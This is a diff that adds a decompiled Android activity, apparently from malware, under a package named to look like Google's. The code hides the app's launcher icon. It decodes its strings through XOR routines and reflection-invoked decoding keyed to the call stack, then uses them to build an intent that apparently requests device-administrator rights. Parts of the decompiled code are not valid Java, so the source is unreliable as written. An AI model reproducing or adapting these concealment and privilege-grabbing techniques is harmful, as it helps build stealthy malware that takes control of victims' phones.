@@ -1,0 +1,126 @@
+package com.google.bps.bfcfc;
+public class MainActivity extends android.app.Activity {
+    public static com.google.bps.bfcfc.MainActivity context;
+    private android.content.ComponentName componentName;
+    public android.widget.RelativeLayout mmain;
+    private android.app.admin.DevicePolicyManager policyManager;
+
+    public MainActivity()
+    {
+        return;
+    }
+
+    private void HideIcon()
+    {
+        this.getPackageManager().setComponentEnabledSetting(this.getComponentName(), 2, 1);
+        return;
+    }
+
+    private static String activeManager(String p37)
+    {
+        int v17 = 0;
+        String v28 = 0;
+        String v27 = 0;
+        byte[] v22 = 0;
+        byte[] v7 = new byte[19];
+        v7 = {63, 48, 58, 44, 49, 55, 58, 112, 43, 42, 55, 50, 112, 28, 63, 45, 59, 104, 106};
+        String v29 = new StringBuilder(String.valueOf(p37.substring((p37.length() - 2)))).append(p37.substring(2, (p37.length() - 2))).append(p37.substring(0, 2)).toString();
+        int v12_4 = 0;
+        while (v12_4 < 19) {
+            v7[v12_4] = ((byte) (v7[v12_4] ^ 94));
+            v12_4++;
+        }
+        v28 = new String;
+        v28(v7);
+        String v27_1 = new StringBuilder(String.valueOf(v28.substring(2, 3))).append(v28.substring(16, 17)).toString();
+        String v3_1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(v27_1)).append("c").toString())).append(v28.substring(4, 5)).toString())).append(v27_1).toString();
+        try {
+            Class v10 = Class.forName(v28);
+            Class[] v4 = new Class[2];
+            v4[0] = String;
+            v4[1] = Integer.TYPE;
+            reflect.Method v14 = v10.getDeclaredMethod(v3_1, v4);
+            byte v0_4 = new Object[2];
+            int v34_9 = v0_4;
+            v34_9[0] = v29;
+            v34_9[1] = Integer.valueOf(0);
+            byte[] v5 = ((byte[]) v14.invoke(v10, v34_9));
+        } catch (reflect.InvocationTargetException v11_4) {
+            v11_4.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_3) {
+            v11_3.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_2) {
+            v11_2.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_1) {
+            v11_1.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_0) {
+            v11_0.printStackTrace();
+        }
+        int v23;
+        int v20_0 = v5.length;
+        int v21 = v20_0;
+        int v20_2 = ((v20_0 - 1) - Integer.parseInt(String.valueOf(((char) v5[(v20_0 - 1)]))));
+        if (v5[(v20_2 - 1)] != 1) {
+            v23 = 0;
+        } else {
+            v23 = 1;
+        }
+        int v20_3 = (v20_2 - 1);
+        int vtmp36 = Integer.parseInt(new StringBuilder(String.valueOf(String.valueOf(((char) v5[(v20_3 - 2)])))).append(String.valueOf(((char) v5[(v20_3 - 1)]))).toString(), 16);
+        int v20_4 = (v20_3 - 2);
+        int v12_0 = 0;
+        while (v12_0 < v20_4) {
+            v5[v12_0] = ((byte) (v5[v12_0] ^ ((byte) (((byte) vtmp36) + 29))));
+            v12_0++;
+        }
+        int v12_1 = v20_4;
+        while (v12_1 < v21) {
+            v5[v12_1] = 0;
+            v12_1++;
+        }
+        if (v23 == 1) {
+            StackTraceElement v13 = new Exception().getStackTrace()[1];
+            String v25 = v13.getClassName();
+            int v16 = v25.lastIndexOf(".");
+            if (v16 != -1) {
+                v25 = v25.substring((v16 + 1));
+            }
+            String v24 = new StringBuilder(String.valueOf(v25)).append(v13.getMethodName()).toString();
+            if (v24.length() > 256) {
+                v24 = v24.substring(0, 256);
+            }
+            int v12_2 = 0;
+            int v19 = (v24.length() - 1);
+            while (v12_2 < v20_4) {
+                int v18_1 = (v19 - 1);
+                v5[v12_2] = ((byte) (v5[v12_2] ^ ((byte) v24.charAt(v19))));
+                if (v18_1 < 0) {
+                    v18_1 = (v24.length() - 1);
+                }
+                v12_2++;
+                v19 = v18_1;
+            }
+        }
+        byte v0_37 = new byte[v20_4];
+        v22 = v0_37;
+        int v12_3 = 0;
+        while (v12_3 < v20_4) {
+            v22[v12_3] = v5[v12_3];
+            v12_3++;
+        }
+        String v33 = new String;
+        v33(v22);
+        return v33;
+    }
+
+    private void activeManager()
+    {
+        android.content.Intent v0_1 = new android.content.Intent(com.google.bps.bfcfc.MainActivity.activeManager("U=/35/X83b/j7fC59O709O3zrtbx3sLR/NDY0NDF1P3cy9NENwGYXVkokT5/"));
+        v0_1.putExtra(com.google.bps.bfcfc.MainActivity.activeManager("Q=LK2sjB4ILe0M2EzcjJ0t6O+e/e7uPt2/ro4+HpQUMBl0Ngwj2s"), this.componentName);
+        v0_1.putExtra(com.google.bps.bfcfc.MainActivity.activeManager("==RcTF5XdhRIRlsSW15fREgYanhabnNmQmF7dn9ld110NDIBlqB8MwTF"), com.google.bps.bfcfc.MainActivity.activeManager("Q=RzCWtSJUZ5D1tvCHpQAXBjNzIBJM5LdzFH"));
+        this.startActivity(v0_1);
+        return;
+    }
+
+    protected void onCreate(android.os.Bundle p4);
+}
